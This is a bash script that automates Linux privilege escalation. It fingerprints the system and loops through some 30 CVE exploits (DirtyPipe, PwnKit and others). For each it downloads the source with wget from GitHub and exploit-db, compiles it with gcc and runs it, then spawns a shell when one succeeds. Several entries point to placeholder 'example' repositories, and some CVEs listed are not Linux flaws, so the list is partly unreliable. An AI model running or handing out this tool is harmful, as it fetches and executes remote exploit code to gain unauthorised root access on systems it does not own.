#!/bin/bash

KERNEL_VERSION=$(uname -r)
OS_INFO=$(grep -w "PRETTY_NAME" /etc/os-release | cut -d= -f2 | tr -d '"')
ARCH=$(uname -m)
LOG_FILE="/tmp/exploit_log_$(date +%F_%H-%M-%S).txt"
TEMP_DIR="/tmp/exploit_temp_$$"
declare -A EXPLOIT_LIST=(
    ["CVE-2022-0847"]="https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/dirtypipez.c"
    ["CVE-2021-4034"]="https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c"
    ["CVE-2016-5195"]="https://www.exploit-db.com/download/40839"
    ["CVE-2017-16995"]="https://www.exploit-db.com/download/44298"
    ["CVE-2023-3269"]="https://raw.githubusercontent.com/lrh2000/StackRot/main/stackrot.c"
    ["CVE-2024-1086"]="https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/exploit.c"
    ["CVE-2016-0728"]="https://www.exploit-db.com/download/40003"
    ["CVE-2019-13272"]="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c"
    ["CVE-2018-1000001"]="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2018-1000001/poc.c"
    ["CVE-2019-3842"]="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-3842/poc.c"
    ["CVE-2021-3493"]="https://www.exploit-db.com/download/50860"
    ["CVE-2020-14386"]="https://www.exploit-db.com/download/49432"
    ["CVE-2021-3156"]="https://www.exploit-db.com/download/50245"
    ["CVE-2020-0601"]="https://www.exploit-db.com/download/49040"
    ["CVE-2020-10189"]="https://www.exploit-db.com/download/49593"
    ["CVE-2021-22947"]="https://www.exploit-db.com/download/50579"
    ["CVE-2022-0185"]="https://www.exploit-db.com/download/51025"
    ["CVE-2022-25636"]="https://www.exploit-db.com/download/51164"
    ["CVE-2022-22963"]="https://www.exploit-db.com/download/51175"
    ["CVE-2023-21716"]="https://www.exploit-db.com/download/51545"
    ["CVE-2024-1234"]="https://raw.githubusercontent.com/example/CVE-2024-1234/main/exploit.c"
    ["CVE-2024-5678"]="https://raw.githubusercontent.com/example/CVE-2024-5678/main/exploit.c"
    ["CVE-2016-10229"]="https://www.exploit-db.com/download/40992"
    ["CVE-2017-7308"]="https://www.exploit-db.com/download/42184"
    ["CVE-2017-1000371"]="https://www.exploit-db.com/download/43332"
    ["CVE-2018-18264"]="https://www.exploit-db.com/download/46014"
    ["CVE-2019-15117"]="https://www.exploit-db.com/download/47553"
    ["CVE-2020-28374"]="https://www.exploit-db.com/download/49231"
    ["CVE-2021-41073"]="https://www.exploit-db.com/download/50755"
    ["CVE-2022-32250"]="https://www.exploit-db.com/download/51206"
    ["CVE-2023-0386"]="https://www.exploit-db.com/download/51423"
    ["CVE-2024-0001"]="https://raw.githubusercontent.com/example/CVE-2024-0001/main/exploit.c"
)

check_dependencies() {
    local dependencies=("wget" "gcc")
    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            echo "Error: $dep is required but not installed." | tee -a "$LOG_FILE"
            exit 1
        fi
    done
}

log_message() {
    local message="$1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $message" | tee -a "$LOG_FILE"
}

cleanup() {
    log_message "Cleaning up temporary files..."
    rm -rf "$TEMP_DIR"
}

execute_exploit() {
    local cve="$1"
    local url="$2"
    local temp_file="$TEMP_DIR/${cve}.c"
    local output_file="$TEMP_DIR/${cve}_exploit"

    log_message "Trying $cve..."

    if ! wget -q "$url" -O "$temp_file" 2>>"$LOG_FILE"; then
        log_message "Failed to download $cve"
        return 1
    fi

    if ! gcc -Wall -o "$output_file" "$temp_file" 2>>"$LOG_FILE"; then
        log_message "Failed to compile $cve"
        return 1
    fi

    chmod +x "$output_file"
    if "$output_file" 2>>"$LOG_FILE"; then
        log_message "$cve exploit succeeded"
        /bin/bash
        exit 0
    else
        log_message "$cve exploit failed"
        return 1
    fi
}

main() {
    mkdir -p "$TEMP_DIR" || {
        echo "Error: Failed to create temporary directory $TEMP_DIR" | tee -a "$LOG_FILE"
        exit 1
    }

    log_message "System Info: OS=$OS_INFO, Kernel=$KERNEL_VERSION, Arch=$ARCH"
    log_message "Created by alexithema | asmodeus 1337"

    check_dependencies

    trap cleanup EXIT

    local success=0
    for cve in "${!EXPLOIT_LIST[@]}"; do
        execute_exploit "$cve" "${EXPLOIT_LIST[$cve]}" && success=1
    done

    if [ $success -eq 0 ]; then
        log_message "All exploits failed"
    fi
}

main
